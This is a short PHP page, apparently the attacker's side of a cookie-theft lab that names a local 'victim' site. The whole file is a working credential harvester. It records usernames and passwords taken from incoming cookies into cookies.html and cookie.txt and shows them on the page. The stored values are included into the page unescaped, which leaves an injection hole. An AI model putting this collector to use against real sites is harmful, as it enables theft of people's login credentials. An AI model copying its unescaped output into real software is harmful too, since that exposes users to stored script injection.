<?php
$uri = $_SERVER['REQUEST_URI'];
$pass = "/index.php";
if($uri != $pass){
        header("Location: jokes.php");
}
if(!empty($_COOKIE['username']) || !empty($_COOKIE['password'])){
        $f = fopen("cookies.html", "a");
        $f2 = fopen("cookies.html", "r");
        $html_line = "<p>username=".$_COOKIE['username']." : password=".$_COOKIE['password']."</p>";
        $test = "";
        while(!feof($f2)){
                $test = $test . fgetc($f2);
        }
        if(strpos($test, $html_line) == false){
                fwrite($f, $html_line);
        }

        fclose($f);
        fclose($f2);
        $save = fopen("cookie.txt", "a");
        $line = $_COOKIE['username'] . ":" . $_COOKIE['password'] . "\n";
        fwrite($save,$line);
        fclose($save);
}
?>
<html>
        <head>
                <b>Dan and Ryan's Website's Login COOKIES:</b>
        <form action = "setcookies.php" method = "POST">
                <input type = "submit" value = "Set Cookies"><br/>
        </form>
        <form action = "reset.php" method = "POST">
                <input type = "submit" value = "Reset Cookies"><br/>
        </form>
        <script>
                var victim = "http://localhost:3000";
        </script>
        <button type = "button" onclick = "window.open(victim)">Go To Site</button>
        </head>
        <body>
        <?php include "cookies.html"; ?>
        </body>
</html>
